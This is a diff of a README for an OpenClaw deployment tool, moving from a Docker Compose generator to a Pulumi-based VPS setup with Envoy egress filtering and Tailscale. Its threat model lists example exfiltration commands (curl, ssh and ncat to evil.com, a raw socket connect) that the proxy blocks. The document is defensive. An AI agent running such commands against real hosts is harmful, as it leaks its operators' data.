@@ -1,323 +1,196 @@
-# openclaw-docker
+# openclaw-deploy
 
-[![Go](https://img.shields.io/badge/Go-1.25-00ADD8?logo=go&logoColor=white)](https://go.dev)
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-supported-6E56CF)](https://docs.openclaw.ai/install/docker)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
+[![Pulumi](https://img.shields.io/badge/Pulumi-IaC-8A3391?logo=pulumi&logoColor=white)](https://www.pulumi.com)
+[![OpenClaw](https://img.shields.io/badge/OpenClaw-supported-6E56CF)](https://docs.openclaw.ai)
 ![macOS](https://img.shields.io/badge/macOS-supported-000000?logo=apple&logoColor=white)
 ![Linux](https://img.shields.io/badge/Linux-supported-FCC624?logo=linux&logoColor=black)
 [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/schmitthub/openclaw-docker)
 
-CLI that generates a hardened Docker Compose stack for [OpenClaw](https://openclaw.ai) with network-level egress isolation via Envoy proxy.
+Pulumi TypeScript IaC that provisions remote VPS hosts and deploys [OpenClaw](https://openclaw.ai) gateway fleets with network-level egress isolation via Envoy proxy and Tailscale networking.
 
-> This is in early development - I will be adding features and fixing bugs to serve my own needs as I experiment with OpenClaw. And claude boy generated a lot of the docs so they might be hallucinated slightly. But contributions and feedback are welcome!
-
-## Install
-
-**Homebrew:**
-
-```bash
-brew install schmitthub/tap/openclaw-docker
-```
-
-**Install script (Linux / macOS):**
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/schmitthub/openclaw-docker/main/scripts/install.sh | bash
-```
-
-Options: `--global` (install to `/usr/local/bin`), `--local` (default, `~/.local/bin`), `--install-dir <dir>`, `--version <tag>`.
-
-**From source:**
-
-```bash
-git clone https://github.com/schmitthub/openclaw-docker.git
-cd openclaw-docker
-go build -o openclaw-docker .
-```
-
-### Quick Start with Discord
-
-Follow [their Discord Bot setup instructions](https://docs.openclaw.ai/channels/discord)
-
-Once you have your bot token...
-
-```bash
-openclaw-docker generate --allowed-domains "discord.com,gateway.discord.gg,cdn.discordapp.com"
-cd openclaw-deploy
-./setup.sh # enter your API keys, models, discord bot token, etc
-# You should now have a local docker compose stack with OpenClaw and Envoy running, with only access to the allowed domains, most AI providers, clawhub, and homebrew domains for installing tools and skills. If stuff is blocked update envoy's config to add more or reurn the command (but it will overwrite currently)
-# Visit https://localhost/?token=<your-token> (outputted during setup) to access the dashboard, and accept the self-signed certificate warning.
-./openclaw devices approve --latest # this script gives you access to an external container pre-paired with the gateway and envoy's selfed signed certs trusted so that wss:// works. It's essentially a "remote" CLI connecting through the proxy to your gateway. Approves your webUI pairing
-# DM your discord bot and get a pairing code then...
-docker compose exec openclaw-gateway openclaw pairing approve discord XXXXXXXX # ./openclaw remote container script doesn't seem to have the permissions for some reason to approve channel pairing... figuring that out next.
-docker compose restart openclaw-gateway
-```
-
-You can manually modify openclaw.json in `data/config/openclaw.json` to add your Discord guild (server ID) and set `requireMention` settings etc. You should be chattin away now.
-
-You can also deploy this to a server with mTLS (to lock down the origin behind something like Cloudflare) by generating with `--external-origin` and following the server deployment instructions below. I don't have certbot integration yet. Envoy will have mTLS commented out in `compose/envoy/envoy.yaml` by default, but you can uncomment it and add the Cloudflare origin pull CA cert to require mTLS client certs for all incoming connections, and it will accept your self signed cert from the Cloudflare SSL dashboard.
+> Early development — features and conventions may change. Contributions and feedback welcome!
 
 ## Table of Contents
 
-- [openclaw-docker](#openclaw-docker)
-  - [Install](#install)
-    - [Quick Start with Discord](#quick-start-with-discord)
-  - [Table of Contents](#table-of-contents)
-  - [Architecture](#architecture)
-  - [Threat Model](#threat-model)
-  - [Quickstart](#quickstart)
-    - [Prerequisites](#prerequisites)
-    - [1. Generate deployment artifacts](#1-generate-deployment-artifacts)
-    - [2. Run setup](#2-run-setup)
-    - [3. Open the dashboard](#3-open-the-dashboard)
-  - [Server Deployment](#server-deployment)
-    - [1. Generate with `--external-origin`](#1-generate-with---external-origin)
-    - [2. Point your reverse proxy at port 443](#2-point-your-reverse-proxy-at-port-443)
-    - [3. Lock down the origin with mTLS (Cloudflare Authenticated Origin Pulls)](#3-lock-down-the-origin-with-mtls-cloudflare-authenticated-origin-pulls)
-  - [Common Operations](#common-operations)
-  - [Egress Domain Whitelist](#egress-domain-whitelist)
-  - [CLI Flags](#cli-flags)
-  - [Known Issues](#known-issues)
-    - [Device auth behind reverse proxy](#device-auth-behind-reverse-proxy)
-  - [Development](#development)
-  - [Repository Structure](#repository-structure)
+- [Architecture](#architecture)
+- [Threat Model](#threat-model)
+- [Prerequisites](#prerequisites)
+- [Quickstart](#quickstart)
+- [Stack Configuration](#stack-configuration)
+- [Component Hierarchy](#component-hierarchy)
+- [Egress Domain Whitelist](#egress-domain-whitelist)
+- [Common Operations](#common-operations)
+- [Development](#development)
+- [Repository Structure](#repository-structure)
+- [Known Limitations](#known-limitations)
 
 ## Architecture
 
 ```
-┌──────────────────────────────────────────────────────────────────────┐
-│  Host                                                                │
-│                                                                      │
-│   Browser ─── https://localhost ──┐                                  │
-│                                   │                                  │
-│   ./openclaw <cmd> ───────────────┤ (docker run, wss://envoy:443)   │
-│     (remote CLI client)           │  NODE_EXTRA_CA_CERTS for TLS    │
-│     data/cli-config/ bind mount   │  device-paired for auth         │
-│                                   │                                  │
-│   ┌───────────────────────────────┼────────────────────────────────┐ │
-│   │  openclaw-egress network      │                                │ │
-│   │                               ▼ :443                           │ │
-│   │                  ┌─────────────────────────┐                   │ │
-│   │    Internet ◄──► │     Envoy (172.28.0.2)  │                   │ │
-│   │   (whitelisted   │  Ingress:               │                   │ │
-│   │    domains       │  • TLS termination      │                   │ │
-│   │    only)         │  • X-Forwarded-For      │                   │ │
-│   │                  │  • WebSocket upgrade    │                   │ │
-│   │                  │                         │                   │ │
-│   │    Cloudflare    │  Egress (:10000):        │                   │ │
-│   │    1.1.1.2  ◄──  │  • TLS Inspector (SNI)  │                   │ │
-│   │    1.0.0.2       │  • Domain whitelist      │                   │ │
-│   │   (malware       │  • Non-TLS = DENIED     │                   │ │
-│   │    blocking)     │                         │                   │ │
-│   │                  │  DNS (:53 UDP):          │                   │ │
-│   │                  │  • Forwards to Cloudflare│                   │ │
-│   │                  │  • Malware domains blocked│                  │ │
-│   │                  └────────────┬────────────┘                   │ │
-│   └───────────────────────────────┼────────────────────────────────┘ │
-│   ┌───────────────────────────────┼────────────────────────────────┐ │
-│   │  openclaw-internal network    │  (internal: true — NO default  │ │
-│   │  subnet: 172.28.0.0/24       │   route to the internet)       │ │
-│   │                               ▼                                │ │
-│   │   ┌───────────────────────────────────────────┐                │ │
-│   │   │          openclaw-gateway                  │                │ │
-│   │   │  • OpenClaw + pnpm + bun                  │                │ │
-│   │   │  • dns: [172.28.0.2] (Envoy)              │                │ │
-│   │   │                                           │                │ │
-│   │   │  entrypoint.sh (root-owned, immutable):   │                │ │
-│   │   │  ┌───────────────────────────────────┐    │                │ │
-│   │   │  │ ip route: default via Envoy       │    │                │ │
-│   │   │  │ NAT:  ALL outbound TCP ──DNAT──►  │    │                │ │
-│   │   │  │       Envoy:10000 (transparent)   │    │                │ │
-│   │   │  │ FILTER: OUTPUT DROP (defense in   │    │                │ │
-│   │   │  │         depth, only Envoy allowed) │    │                │ │
-│   │   │  └───────────────────────────────────┘    │                │ │
-│   │   │  • Drops to node user via gosu            │                │ │
-│   │   │  • No proxy env vars — apps unaware       │                │ │
-│   │   └───────────────────────────────────────────┘                │ │
-│   └────────────────────────────────────────────────────────────────┘ │
-│                                                                      │
-│   data/config/     ← gateway config (openclaw.json, identity/)      │
-│   data/cli-config/ ← CLI remote config + device identity            │
-│   data/workspace/  ← bind-mounted workspace                         │
-└──────────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────────┐
+│  Remote VPS (Hetzner)                                               │
+│                                                                     │
+│   Tailscale Serve/Funnel ──┐                                       │
+│     (ingress: HTTPS, WSS)  │                                       │
+│                             ▼ 127.0.0.1:<port>                     │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │  openclaw-internal network (internal: true, 172.28.0.0/24)  │   │
+│   │  No default route to internet                               │   │
+│   │                                                             │   │
+│   │   ┌───────────────────────────────────┐                     │   │
+│   │   │  openclaw-gateway-<profile>       │                     │   │
+│   │   │  • OpenClaw + pnpm + bun + brew   │                     │   │
+│   │   │  • dns: [172.28.0.2] (Envoy)      │                     │   │
+│   │   │                                   │                     │   │
+│   │   │  entrypoint.sh (root, immutable): │                     │   │
+│   │   │  ┌─────────────────────────────┐  │                     │   │
+│   │   │  │ ip route default via Envoy  │  │                     │   │
+│   │   │  │ NAT: ALL TCP → DNAT Envoy   │  │                     │   │
+│   │   │  │ FILTER: OUTPUT DROP default │  │                     │   │
+│   │   │  │ gosu → drops to node user   │  │                     │   │
+│   │   │  └─────────────────────────────┘  │                     │   │
+│   │   └───────────────────────────────────┘                     │   │
+│   │              ... (N gateways per server)                    │   │
+│   │                                                             │   │
+│   │                  ┌─────────────────────────┐                │   │
+│   │    Internet ◄──► │  Envoy (172.28.0.2)     │                │   │
+│   │   (whitelisted   │                         │                │   │
+│   │    domains only) │  Egress (:10000):        │                │   │
+│   │                  │  • TLS Inspector (SNI)  │                │   │
+│   │    Cloudflare    │  • Domain whitelist      │                │   │
+│   │    1.1.1.2 ◄──   │  • Non-TLS = DENIED     │                │   │
+│   │    1.0.0.2       │                         │                │   │
+│   │                  │  DNS (:53 UDP):          │                │   │
+│   │                  │  • → Cloudflare (malware │                │   │
+│   │                  │    blocking resolvers)   │                │   │
+│   │                  └─────────────────────────┘                │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                     │
+│   Tailscale daemon (host-level, manages Serve/Funnel)              │
+│   Docker daemon (provisioned by HostBootstrap)                     │
+└─────────────────────────────────────────────────────────────────────┘
+
+Operator machine:
+  $ pulumi up --stack dev     # provisions server + deploys everything
+  $ pulumi destroy --stack dev  # tears down
 ```
+
+One Pulumi stack = one server. Each server runs N gateway instances sharing a single Envoy egress proxy. Tailscale handles all ingress (Serve for private tailnet access, Funnel for public webhooks). No self-managed TLS certificates or reverse proxies.
 
 ## Threat Model
 
 **Threat:** Prompt injection coerces the AI agent into exfiltrating data. The agent can run any tool available in the container — `curl`, `wget`, `ncat`, `ssh`, raw sockets, subprocesses. It can use any port, any protocol, and target any destination. Application-level proxy settings (`HTTP_PROXY`) are trivially bypassed.
 
-**Defense-in-depth (four layers):**
+**Defense-in-depth (five layers):**
 
 | Layer | Mechanism | What it stops | Bypassable by `node` user? |
 |-------|-----------|---------------|---------------------------|
 | **1. Network isolation** | Docker `internal: true` network | No default route to internet — no IP to reach | No |
-| **2. iptables DNAT** | NAT table redirects ALL outbound TCP to Envoy:10000 | Every TCP connection, regardless of tool/port/protocol, goes through Envoy | No (`CAP_NET_ADMIN` required, root only) |
-| **3. Envoy SNI whitelist** | TLS Inspector reads SNI from ClientHello, forwards only whitelisted domains | Non-whitelisted HTTPS, all non-TLS (SSH, HTTP, raw TCP) | No (Envoy runs separately, resolves DNS independently) |
-| **4. Malware-blocking DNS** | Cloudflare 1.1.1.2 / 1.0.0.2 (via Envoy DNS listener) | Known malware, phishing, and C2 domains blocked at DNS resolution | No (Envoy resolves DNS, containers cannot override) |
+| **2. iptables DNAT + FILTER** | Root-owned rules: all outbound TCP → Envoy:10000 | Every TCP connection goes through Envoy | No (`CAP_NET_ADMIN` required, root only) |
+| **3. Envoy SNI whitelist** | TLS Inspector reads SNI, forwards only whitelisted domains | Non-whitelisted HTTPS, all non-TLS (SSH, HTTP, raw TCP) | No (Envoy resolves DNS independently) |
+| **4. Egress policy engine** | Typed `EgressRule[]` with domain/IP/CIDR + protocol support | Structured policy control beyond simple domain lists | No (Envoy config, not in container) |
+| **5. Malware-blocking DNS** | Cloudflare 1.1.1.2 / 1.0.0.2 via Envoy DNS listener | Known malware, phishing, and C2 domains | No (Envoy resolves DNS, containers cannot override) |
 
 **Why SNI spoofing doesn't work:** If an attacker forges the SNI to `api.anthropic.com` while connecting to `evil.com`'s IP, Envoy resolves `api.anthropic.com` via DNS independently and connects to the **real** IP — not the attacker's server.
 
-**DNS security:** All DNS resolution from internal containers is forwarded through Envoy to Cloudflare's malware-blocking resolvers (1.1.1.2 / 1.0.0.2). These resolvers refuse to resolve known malware, phishing, and command-and-control domains — adding a DNS-layer defense even for whitelisted TLS connections. Docker's embedded DNS cannot forward external queries on `internal: true` networks, so Envoy serves as the DNS forwarder on its static IP (172.28.0.2).
-
 **What gets blocked:**
-- `curl https://evil.com` — SNI `evil.com` not in whitelist → **BLOCKED**
+- `curl https://evil.com` — SNI not in whitelist → **BLOCKED**
 - `ssh user@evil.com` — no TLS, no SNI → **BLOCKED**
-- `ncat evil.com 4444` — no TLS, no SNI → **BLOCKED**
-- `curl http://evil.com` — no TLS, no SNI → **BLOCKED**
-- `python3 -c "import socket; s=socket.socket(); s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
+- `ncat evil.com 4444` — no TLS → **BLOCKED**
+- `python3 -c "import socket; s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
 - `curl https://api.anthropic.com` — SNI matches whitelist → **ALLOWED**
+
+## Prerequisites
+
+- [Node.js](https://nodejs.org/) (v18+)
+- [Pulumi CLI](https://www.pulumi.com/docs/install/)
+- [Tailscale](https://tailscale.com/) account with an auth key
+- A Hetzner Cloud account with an SSH key uploaded (Phase 1; DigitalOcean/Oracle planned)
 
 ## Quickstart
 
-### Prerequisites
-
-- [Docker](https://docs.docker.com/get-docker/) with `docker compose` v2
-
-### 1. Generate deployment artifacts
-
 ```bash
-openclaw-docker generate \
-  --openclaw-version latest \
-  --output ./openclaw-deploy \
-  --dangerous-inline
-```
-
-This creates:
-
-```
-openclaw-deploy/
-├── compose/
-│   ├── envoy/
-│   │   ├── envoy.yaml          # Ingress + egress proxy config
-│   │   ├── server-cert.pem     # Self-signed TLS cert (SANs: localhost, envoy, gateway)
-│   │   └── server-key.pem      # TLS private key
-│   └── openclaw/
-│       ├── Dockerfile           # node:22-bookworm + iptables + iproute2 + gosu + pnpm + bun
-│       └── entrypoint.sh        # iptables setup, drops to node user
-├── compose.yaml                 # 2 services: envoy, openclaw-gateway
-├── .env.openclaw                # Runtime env vars (token, ports, bind)
-├── setup.sh                     # Build, onboard, configure, pair CLI, start
-├── openclaw                     # CLI wrapper (docker run, remote client via wss://envoy:443)
-└── manifest.json                # Resolved version metadata
-```
-
-### 2. Run setup
-
-```bash
+# Clone and install
+git clone https://github.com/schmitthub/openclaw-docker.git openclaw-deploy
 cd openclaw-deploy
-./setup.sh
+npm install
+
+# Initialize a stack
+pulumi stack init dev
+cp Pulumi.dev.yaml.example Pulumi.dev.yaml
+
+# Set required secrets
+pulumi config set --secret tailscaleAuthKey <your-tailscale-auth-key>
+pulumi config set --secret gatewayToken-personal $(openssl rand -hex 32)
+
+# Edit Pulumi.dev.yaml with your server config, egress policy, and gateway profiles
+
+# Deploy
+pulumi up
 ```
 
-`setup.sh` does the following in order:
+`pulumi up` will:
+1. Provision a Hetzner VPS
+2. Install Docker + Tailscale on the host (switching to Tailscale IP for subsequent commands)
+3. Create Docker networks + deploy Envoy egress proxy
+4. Build gateway Docker images (with baked packages) and deploy containers
+5. Configure each gateway via `docker exec openclaw config set` commands
+6. Set up Tailscale Serve/Funnel on the host for ingress
 
-1. Creates `data/config/`, `data/workspace/`, `data/config/identity/`
-2. Builds Docker images (`docker compose build`)
-3. Runs interactive onboarding (`openclaw onboard --no-install-daemon`) — skippable with `--skip-onboarding`
-4. Sets `gateway.mode local` (safety net — required for gateway to start)
-5. Generates a gateway token (or reuses from onboarding)
-6. Configures gateway auth, trusted proxies, Control UI origins, mDNS off (via `gw_config`)
-7. Configures CLI for remote access (`wss://envoy:443`) via `./openclaw` wrapper
-8. Starts services (`docker compose up -d`)
-9. Waits for gateway, pairs CLI device (`devices approve --latest`)
+## Stack Configuration
 
-Gateway config is managed via `gw_config` (a `docker compose run --no-deps` helper that passes `openclaw` as CMD to entrypoint.sh). The CLI runs as a `docker run --rm` container on the `openclaw-egress` network with its config bind-mounted from `data/cli-config/`, connecting to the gateway through Envoy's TLS ingress as a remote client.
+Configuration lives in `Pulumi.<stack>.yaml`. See `Pulumi.dev.yaml.example` for a complete example.
 
-### 3. Open the dashboard
+| Key | Type | Required | Description |
+|-----|------|----------|-------------|
+| `provider` | `"hetzner"` | yes | VPS provider (DigitalOcean/Oracle Phase 2) |
+| `serverType` | string | yes | Server type (e.g. `cx22`, `cax21`) |
+| `region` | string | yes | Datacenter region (e.g. `fsn1`) |
+| `sshKeyId` | string | yes | SSH key ID at provider |
+| `tailscaleAuthKey` | secret | yes | One-time Tailscale auth key |
+| `egressPolicy` | `EgressRule[]` | yes | User egress rules (additive to hardcoded) |
+| `gateways` | `GatewayConfig[]` | yes | Gateway profile definitions (1+) |
+| `gatewayToken-<profile>` | secret | per-gateway | Auth token for each gateway |
 
-The setup script prints the URL at the end:
+**Gateway profile fields:**
+
+| Field | Type | Description |
+|-------|------|-------------|
+| `profile` | string | Unique name (used in resource names) |
+| `version` | string | OpenClaw version (`latest` or semver) |
+| `packages` | string[] | Extra apt packages baked into the image |
+| `port` | number | Gateway port (e.g. `18789`) |
+| `tailscale` | `"serve" \| "funnel"` | Tailscale ingress mode |
+| `configSet` | object | Key-value pairs for `openclaw config set` |
+| `installBrowser` | boolean | Bake Playwright + Chromium (~300MB) |
+| `env` | object | Extra environment variables |
+
+## Component Hierarchy
+
+Components compose sequentially — each depends on the previous:
 
 ```
-https://localhost/?token=<your-token>
+Server (Hetzner VPS provisioning)
+  ↓ connection (public IP SSH)
+HostBootstrap (Docker + Tailscale install)
+  ↓ tailscaleIP, dockerHost (switches to Tailscale IP)
+EnvoyEgress (Docker networks + Envoy container)
+  ↓ internalNetworkName
+Gateway(s) (1+ OpenClaw instances per server)
+  ↓ optional Tailscale Serve/Funnel
 ```
 
-Accept the self-signed certificate warning in your browser.
-
-## Server Deployment
-
-To expose OpenClaw on a public server behind a domain (e.g. `https://myclaw.example.com`):
-
-### 1. Generate with `--external-origin`
-
-```bash
-openclaw-docker generate \
-  --openclaw-version latest \
-  --output ./openclaw-deploy \
-  --external-origin "https://myclaw.example.com" \
-  --dangerous-inline
-```
-
-This adds your domain to:
-- The Control UI's `allowedOrigins` list alongside `https://localhost`
-- The self-signed TLS certificate SANs (so `NODE_EXTRA_CA_CERTS` works for the hostname)
-
-### 2. Point your reverse proxy at port 443
-
-Envoy terminates TLS on port 443. Your edge proxy (Cloudflare, nginx, Caddy) should forward traffic to this port.
-
-### 3. Lock down the origin with mTLS (Cloudflare Authenticated Origin Pulls)
-
-The generated `compose/envoy/envoy.yaml` includes commented-out mTLS configuration. To enable it:
-
-1. Download the [Cloudflare origin pull CA certificate](https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/)
-2. Save it as `compose/envoy/cloudflare-origin-pull-ca.pem`
-3. Mount it in `compose.yaml` under the `envoy` service volumes:
-   ```yaml
-   - ./compose/envoy/cloudflare-origin-pull-ca.pem:/etc/envoy/certs/client-ca.pem:ro
-   ```
-4. Uncomment the mTLS lines in `compose/envoy/envoy.yaml`:
-   ```yaml
-   validation_context:
-     trusted_ca:
-       filename: /etc/envoy/certs/client-ca.pem
-   require_client_certificate: true
-   ```
-5. Restart Envoy: `docker compose restart envoy`
-
-With mTLS enabled, only requests presenting a valid Cloudflare client certificate are accepted. Direct connections to the origin IP are rejected.
-
-## Common Operations
-
-The `./openclaw` wrapper runs a `docker run --rm` container on the `openclaw-egress` network that connects to the gateway as a remote client via `wss://envoy:443`. Config and device identity persist via bind mount at `data/cli-config/`. Trusts the self-signed TLS cert via `NODE_EXTRA_CA_CERTS`.
-
-```bash
-# List paired devices
-./openclaw-deploy/openclaw devices list
-
-# Channel setup (WhatsApp QR, Telegram bot, Discord bot)
-./openclaw-deploy/openclaw channels login
-./openclaw-deploy/openclaw channels add --channel telegram --token <token>
-./openclaw-deploy/openclaw channels add --channel discord --token <token>
-
-# List Discord pairing requests
-./openclaw-deploy/openclaw pairing list discord
-
-# Approve a Discord pairing request
-./openclaw-deploy/openclaw pairing approve discord <CODE>
-
-# View gateway logs
-docker compose -f ./openclaw-deploy/compose.yaml logs -f openclaw-gateway
-
-# Restart gateway after config changes
-docker compose -f ./openclaw-deploy/compose.yaml restart openclaw-gateway
-
-# Restart after editing envoy.yaml
-docker compose -f ./openclaw-deploy/compose.yaml restart envoy
-
-# Stop everything
-docker compose -f ./openclaw-deploy/compose.yaml down
-```
-
-**Gateway config changes** (e.g., auth, trusted proxies) require direct file access via compose:
-
-```bash
-cd openclaw-deploy
-docker compose run --rm --no-deps openclaw-gateway openclaw config get gateway
-docker compose run --rm --no-deps openclaw-gateway openclaw config set <key> <value>
-docker compose restart openclaw-gateway  # apply changes
-```
+| Component | Pulumi Type | Provider | Purpose |
+|-----------|-------------|----------|---------|
+| `Server` | `openclaw:infra:Server` | `@pulumi/hcloud` | Provision VPS, expose IP + SSH connection |
+| `HostBootstrap` | `openclaw:infra:HostBootstrap` | `@pulumi/command` | Install Docker + Tailscale on bare host |
+| `EnvoyEgress` | `openclaw:infra:EnvoyEgress` | `@pulumi/docker` + `@pulumi/command` | Create networks, deploy Envoy |
+| `Gateway` | `openclaw:app:Gateway` | `@pulumi/docker` + `@pulumi/command` | Build image, deploy container, configure gateway |
 
 ## Egress Domain Whitelist
 
-Envoy only forwards TLS connections with whitelisted SNI. All other traffic (non-TLS, non-whitelisted) is denied.
+Envoy only forwards TLS connections with whitelisted SNI. All other traffic is denied.
 
 **Always included (hardcoded, cannot be removed):**
 
@@ -325,67 +198,91 @@ Envoy only forwards TLS connections with whitelisted SNI. All other traffic (non
 |----------|---------|
 | Infrastructure | `clawhub.com`, `registry.npmjs.org` |
 | AI providers | `api.anthropic.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `openrouter.ai`, `api.x.ai` |
+| Homebrew | `github.com`, `*.githubusercontent.com`, `ghcr.io`, `formulae.brew.sh` |
 
-`--allowed-domains` is **additive** — all hardcoded domains are always present. To add custom domains:
+User-defined `egressPolicy` rules are **additive** — hardcoded domains are always present. Duplicates are deduplicated by `mergeEgressPolicy()`.
 
-```bash
-openclaw-docker generate \
-  --allowed-domains "api.anthropic.com,api.openai.com,custom.example.com" \
-  --output ./openclaw-deploy \
-  --dangerous-inline
+```yaml
+# Example: add Discord domains to egress policy
+openclaw-deploy:egressPolicy:
+  - dst: "discord.com"
+    proto: tls
+    action: allow
+  - dst: "gateway.discord.gg"
+    proto: tls
+    action: allow
+  - dst: "cdn.discordapp.com"
+    proto: tls
+    action: allow
 ```
 
-To edit the whitelist after generation, modify `compose/envoy/envoy.yaml` directly and restart Envoy.
+## Common Operations
 
-## CLI Flags
+```bash
+# Deploy / update
+pulumi up --stack dev
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--openclaw-version` | `latest` | OpenClaw version (dist-tag or semver partial) |
-| `--output`, `-o` | `./openclaw-deploy` | Output directory |
-| `--allowed-domains` | AI providers | Comma-separated egress whitelist (additive) |
-| `--external-origin` | `""` | External origin for server deployments (e.g. `https://myclaw.example.com`) |
-| `--docker-apt-packages` | `""` | Extra apt packages for Dockerfile |
-| `--openclaw-gateway-port` | `18789` | Gateway port |
-| `--openclaw-gateway-bind` | `lan` | Gateway bind address |
-| `--config`, `-f` | none | YAML config file path |
-| `--dangerous-inline` | `false` | Skip write confirmation prompts |
+# Preview changes without applying
+pulumi preview --stack dev
 
-Config precedence: **flags > env vars (`OPENCLAW_DOCKER_*`) > config file > defaults**
+# View stack outputs (server IP, Tailscale IP, gateway URLs)
+pulumi stack output --stack dev
 
-## Known Issues
+# Tear down everything
+pulumi destroy --stack dev
 
-### Device auth behind reverse proxy
+# View gateway logs (via SSH)
+ssh root@<tailscale-ip> docker logs -f openclaw-gateway-personal
 
-The OpenClaw Control UI WebSocket connection bypasses `gateway.auth.mode` and always requires device pairing, even when running behind a trusted proxy with correct headers. This is an [upstream bug](https://github.com/openclaw/openclaw/issues/25293) ([#4941](https://github.com/openclaw/openclaw/issues/4941)).
+# Restart a gateway after config changes
+ssh root@<tailscale-ip> docker restart openclaw-gateway-personal
 
-**Current approach:** `setup.sh` pairs the CLI device automatically during setup (`devices approve --latest`). The CLI connects through Envoy's TLS ingress (`wss://envoy:443`) as a remote client with its own device identity. Token auth + TLS termination at Envoy is the security boundary for the Control UI.
+# Run an openclaw CLI command inside a gateway container
+ssh root@<tailscale-ip> docker exec openclaw-gateway-personal openclaw config get gateway
+```
 
 ## Development
 
 ```bash
-go build .                  # compile CLI
-go test ./...               # run all tests
-go vet ./...                # static analysis
-make check                  # test + vet + lint
-
-# generate and validate artifacts
-go run . generate --openclaw-version latest --output ./openclaw-deploy --dangerous-inline
-docker compose -f ./openclaw-deploy/compose.yaml config
+npm install                # install dependencies
+npx tsc --noEmit           # type-check
+npx vitest run             # run all tests
+npx vitest run tests/envoy.test.ts  # run a specific test
+npm run check              # typecheck + test
 ```
 
 ## Repository Structure
 
 ```
-main.go                     # CLI entrypoint
-internal/
-  cmd/                      # Cobra commands (root, generate, config, version)
-  render/                   # Artifact generation (Dockerfile, compose, envoy, setup.sh)
-  versions/                 # npm version resolution, manifest I/O
-  config/                   # YAML config loading
-  build/                    # Build metadata (version/date via ldflags)
-  update/                   # GitHub release update checks
-  testenv/                  # Isolated test environments
-e2e/                        # End-to-end generation tests
-  harness/                  # Test harness (isolated FS + Cobra execution)
+index.ts                    # Stack composition entry point
+Pulumi.yaml                 # Pulumi project metadata
+Pulumi.dev.yaml.example     # Example stack config
+components/
+  index.ts                  # Re-exports
+  server.ts                 # VPS provisioning (Hetzner; DO/Oracle Phase 2)
+  bootstrap.ts              # Docker + Tailscale install on bare host
+  envoy.ts                  # Egress proxy: networks + Envoy container
+  gateway.ts                # OpenClaw gateway instance + config + Tailscale
+config/
+  index.ts                  # Re-exports
+  types.ts                  # EgressRule, VpsProvider, GatewayConfig, StackConfig
+  domains.ts                # Hardcoded egress rules + mergeEgressPolicy()
+  defaults.ts               # Constants (networks, ports, images, packages)
+templates/
+  index.ts                  # Re-exports
+  dockerfile.ts             # Renders Dockerfile (node:22-bookworm + tools)
+  entrypoint.ts             # Renders entrypoint.sh (iptables + gosu)
+  envoy.ts                  # Renders envoy.yaml (egress-only proxy + DNS)
+tests/
+  config.test.ts            # Config types and domain merging
+  templates.test.ts         # Dockerfile/entrypoint rendering
+  envoy.test.ts             # Envoy config rendering
+  envoy-component.test.ts   # EnvoyEgress Pulumi component (mocked)
 ```
+
+## Known Limitations
+
+- **Hetzner only** — DigitalOcean and Oracle Cloud providers planned for Phase 2.
+- **TLS-only egress filtering** — SSH and raw TCP egress rules require DNS snooping (Phase 2).
+- **No MITM TLS inspection** — Path-level filtering for HTTPS is structured but deferred to Phase 2.
+- **Tailscale Funnel port limits** — Funnel is limited to ports 443, 8443, 10000 (max 3 public gateways per server).
